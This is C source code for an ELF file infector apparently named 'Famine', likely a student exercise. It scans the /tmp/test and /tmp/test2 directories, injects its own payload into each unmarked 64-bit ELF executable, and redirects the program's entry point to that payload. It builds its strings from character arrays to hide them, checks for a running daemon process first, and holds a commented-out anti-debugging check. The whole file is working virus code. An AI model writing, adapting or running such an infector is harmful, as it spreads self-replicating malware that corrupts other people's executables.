//
// Created by tblaudez on 1/10/22.
//

#include <sys/syscall.h> // __NR_open
#include <fcntl.h> // O_RDONLY
#include <dirent.h> // DT_REG
#include <sys/stat.h> // struct stat
#include <elf.h> // Elf64_Ehdr
#include <sys/mman.h> // MAP_SHARED
#include <sys/ptrace.h> // PTRACE_TRACEME
#include "famine.h"

void injectVirus(Elf64_Ehdr *ehdr) {
	Elf64_Phdr *segment = findUsableSegment((Elf64_Phdr *) ((char *) ehdr + ehdr->e_phoff), ehdr->e_phnum);
	if (segment == NULL) {
		return;
	}

	uint64_t payloadOffset = segment->p_offset + segment->p_filesz;
	void *payloadAddress = (char *) ehdr + payloadOffset;

	ft_memcpy(payloadAddress, _start, PAYLOAD_SIZE);
	ft_memcpy(payloadAddress + PAYLOAD_ENTRY_OFFSET, &payloadOffset, 8);
	ft_memcpy(payloadAddress + HOST_ENTRY_OFFSET, &ehdr->e_entry, 8);

	ehdr->e_entry = payloadOffset;
	segment->p_filesz += PAYLOAD_SIZE;
	segment->p_memsz += PAYLOAD_SIZE;
}

void openFile(const char *directory, const char *file) {
	size_t directoryLen = ft_strlen(directory);
	size_t fileLen = ft_strlen(file);
	char filePath[directoryLen + fileLen + 1];
	ft_strcpy(filePath, directory);
	ft_strcpy(filePath + directoryLen, file);

	int fd = (int) syscall_wrapper(__NR_open, filePath, O_RDWR);
	if (fd == -1) {
		return;
	}

	struct stat fileStat;
	int statRet = (int) syscall_wrapper(__NR_fstat, fd, &fileStat);
	if (statRet == -1) {
		return;
	}

	void *fileMapping = (void *) syscall_wrapper(__NR_mmap, NULL, fileStat.st_size, PROT_READ | PROT_WRITE, MAP_SHARED,fd, NULL);
	if (fileMapping == MAP_FAILED) {
		return;
	}

	if (isValidElf64(fileMapping) && !ft_memmem(fileMapping, fileStat.st_size, signature, SIGNATURE_SIZE)) {
		injectVirus(fileMapping);
	}

	syscall_wrapper(__NR_munmap, fileMapping, fileStat.st_size);
	syscall_wrapper(__NR_close, fd);
}

void startInfection(const char *directory) {
	int fd = (int) syscall_wrapper(__NR_open, directory, O_RDONLY | O_DIRECTORY);
	if (fd == -1) {
		return;
	}

	while (1) {
		char bufDirent[1024];
		int entsize = (int) syscall_wrapper(__NR_getdents64, fd, &bufDirent, sizeof(bufDirent));
		if (entsize <= 0) {
			break;
		}

		for (int offset = 0; offset < entsize;) {
			struct linux_dirent64 *entry = (struct linux_dirent64 *) (bufDirent + offset);
			if (entry->d_type == DT_REG) {
				openFile(directory, entry->d_name);
			}
			offset += entry->d_reclen;
		}
	}

	syscall_wrapper(__NR_close, fd);
}

void famine() {
//	if (syscall_wrapper(__NR_ptrace, PTRACE_TRACEME, 0, NULL) == -1) {
//		syscall_wrapper(__NR_write, STDOUT_FILENO, ((char[]) {'D', 'E', 'B', 'U', 'G', 'G', 'I', 'N', 'G', '\n', '\0'}),10);
//		return;
//	}
	if (DaemonProcessRunning((char[]) {'/', 'p', 'r', 'o', 'c', '/', '\0'})) {
		return;
	}
	startInfection((char[]) {'/', 't', 'm', 'p', '/', 't', 'e', 's', 't', '/', '\0'});
	startInfection((char[]) {'/', 't', 'm', 'p', '/', 't', 'e', 's', 't', '2', '/', '\0'});
}
